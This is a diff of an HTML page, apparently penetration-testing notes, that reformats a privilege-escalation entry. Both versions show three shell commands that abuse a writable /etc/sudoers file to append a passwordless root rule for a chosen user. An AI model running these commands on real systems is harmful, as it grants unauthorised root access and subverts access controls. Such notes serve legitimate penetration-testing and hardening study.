@@ -195,13 +195,13 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="privesc">Privesc</h3>
-<h4 id="abuse-etcsudoers">Abuse <code>/etc/sudoers</code></h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># IF you have control over `/etc/sudoers`</span>
-</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> /etc/sudoers
+<h4 id="abuse-1-writable-etcsudoers">Abuse #1: Writable /etc/sudoers</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">600</span> /etc/sudoers
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;&lt;USER&gt;   ALL=(ALL) NOPASSWD: ALL&#39;</span> &gt;&gt; /etc/sudoers
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">440</span> /etc/sudoers
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
 </div></div>
     
     <script src="/js/utils.js"></script>
